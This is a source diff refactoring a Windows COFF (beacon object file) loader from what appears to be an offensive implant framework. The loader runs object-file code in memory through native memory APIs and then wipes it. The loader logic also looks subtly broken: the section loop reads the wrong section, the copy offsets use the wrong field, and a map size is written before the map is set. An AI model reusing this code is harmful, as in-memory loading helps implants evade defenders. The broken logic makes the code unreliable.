@@ -349,18 +349,18 @@ namespace Objects {
         return true;
     }
 
-    SIZE_T GetFunctionMapSize(PEXECUTABLE exe) {
+    SIZE_T GetFunctionMapSize(EXECUTABLE *image) {
 
         CHAR sym_name[9]    = { };
         INT counter         = 0;
 
-        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section  = SECTION_HEADER(exe->buffer, sec_index);
-            auto reloc          = RELOC_SECTION(exe->buffer, exe->section);
+        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section  = SECTION_HEADER(image->buffer, sec_index);
+            auto reloc          = RELOC_SECTION(image->buffer, image->section);
 
             for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
                 CHAR *buffer        = nullptr;
-                const auto symbols  = exe->symbols;
+                const auto symbols  = image->symbols;
 
                 if (PCOFF_SYMBOL symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                     MemSet(sym_name, 0, sizeof(sym_name));
@@ -368,7 +368,7 @@ namespace Objects {
                     buffer = sym_name;
                 }
                 else {
-                    buffer = RVA(CHAR*, symbols, exe->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
+                    buffer = RVA(CHAR*, symbols, image->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                 }
 
                 if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
@@ -382,7 +382,7 @@ namespace Objects {
         return sizeof(void*) * counter;
     }
 
-    VOID AddCoff(_coff_params *coff) {
+    VOID AddCoff(COFF_PARAMS *coff) {
         HEXANE;
 
         PCOFF_PARAMS head = ctx->bof_cache;
@@ -437,7 +437,7 @@ namespace Objects {
         while (true);
     }
 
-    VOID RemoveCoff(uint32_t bof_id) {
+    VOID RemoveCoff(CONST UINT32 bof_id) {
         HEXANE;
 
         PCOFF_PARAMS prev = { };
@@ -472,79 +472,79 @@ namespace Objects {
         }
     }
 
-    VOID Cleanup(_executable *exe) {
+    VOID Cleanup(EXECUTABLE *image) {
         HEXANE;
 
-        if (!exe || !exe->base) {
+        if (!image || !image->base) {
             return;
         }
-        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
+        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &image->base, &image->size, PAGE_READWRITE, nullptr))) {
             // LOG ERROR
             return;
         }
 
-        MemSet((VOID*) exe->base, 0, exe->size);
+        MemSet((VOID*) image->base, 0, image->size);
 
-        VOID *pointer   = (VOID*) exe->base;
-        size_t size     = exe->size;
+        VOID *pointer   = (VOID*) image->base;
+        SIZE_T size     = image->size;
 
         if (!NT_SUCCESS(ntstatus = ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
             // LOG ERROR
             return;
         }
 
-        if (exe->sec_map) {
-            ZeroFree(exe->sec_map, exe->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
-            exe->sec_map = nullptr;
+        if (image->sec_map) {
+            ZeroFree(image->sec_map, image->nt_head->FileHeader.NumberOfSections * sizeof (IMAGE_SECTION_HEADER));
+            image->sec_map = nullptr;
         }
 
-        ZeroFree(exe, sizeof(EXECUTABLE));
+        ZeroFree(image, sizeof(EXECUTABLE));
     }
 
-    VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size) {
+    VOID CoffLoader(CONST CHAR *entrypoint, VOID *data, VOID *args, CONST SIZE_T args_size) {
         HEXANE;
         // NOTE: sec_map seems to be the only thing that persists
 
-        PEXECUTABLE exe = CreateImageData((UINT8*) data); ;
+        EXECUTABLE *image = CreateImageData((UINT8*) data); ;
         BOOL success = true;
 
-        auto next = (UINT8*) exe->base;
+        auto next = (UINT8*) image->base;
 
-        x_assertb(exe->buffer    = (uint8_t*) data);
-        x_assertb(exe->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
-        x_assertb(ImageCheckArch(exe));
+        x_assertb(image->buffer    = (UINT8*) data);
+        x_assertb(image->sec_map   = (OBJECT_MAP*) Malloc(sizeof(void*) * sizeof(OBJECT_MAP)));
 
-        exe->fn_map->size = GetFunctionMapSize(exe);
+        x_assertb(ImageCheckArch(image));
+        image->fn_map->size = GetFunctionMapSize(image);
 
         // NOTE: calculating address/size of sections before base relocation
-        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section = SECTION_HEADER(exe->buffer, sec_index);
+        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section = SECTION_HEADER(image->buffer, sec_index);
 
-            exe->size += section->SizeOfRawData;
-            exe->size = (size_t) PAGE_ALIGN(exe->size);
+            image->size += section->SizeOfRawData;
+            image->size = (SIZE_T) PAGE_ALIGN(image->size);
         }
 
-        exe->size += exe->fn_map->size;
+        image->size += image->fn_map->size;
 
-        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &image->base, image->size, &image->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
-        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
-            const auto section = SECTION_HEADER(exe->buffer, sec_index);
+        for (auto sec_index = 0; sec_index < image->nt_head->FileHeader.NumberOfSections; sec_index++) {
+            const auto section = SECTION_HEADER(image->buffer, sec_index);
 
-            exe->sec_map[sec_index].size     = section->SizeOfRawData;
-            exe->sec_map[sec_index].address  = next;
+            image->sec_map[sec_index].size     = section->SizeOfRawData;
+            image->sec_map[sec_index].address  = next;
 
-            next += exe->section->SizeOfRawData;
+            next += image->section->SizeOfRawData;
             next = PAGE_ALIGN(next);
 
-            MemCopy(exe->sec_map[sec_index].address, RVA(PBYTE, exe->buffer, exe->section->SizeOfRawData), exe->section->SizeOfRawData);
+            MemCopy(image->sec_map[sec_index].address, RVA(PBYTE, image->buffer, image->section->SizeOfRawData), image->section->SizeOfRawData);
         }
 
         // NOTE: function map goes after the section map ?
-        exe->fn_map = (_object_map*) next;
+        image->fn_map = (OBJECT_MAP*) next;
 
-        x_assertb(BaseRelocation(exe));
-        x_assertb(ExecuteFunction(exe, entrypoint, args, args_size));
+        x_assertb(BaseRelocation(image));
+        x_assertb(ExecuteFunction(image, entrypoint, args, args_size));
 
     defer:
         if (success) {
@@ -554,12 +554,12 @@ namespace Objects {
             // LOG ERROR
         }
 
-        if (exe) {
-            Cleanup(exe);
+        if (image) {
+            Cleanup(image);
         }
     }
 
-    VOID CoffThread(_coff_params *coff) {
+    VOID CoffThread(COFF_PARAMS *coff) {
 
         if (!coff->entrypoint || !coff->data) {
             return;
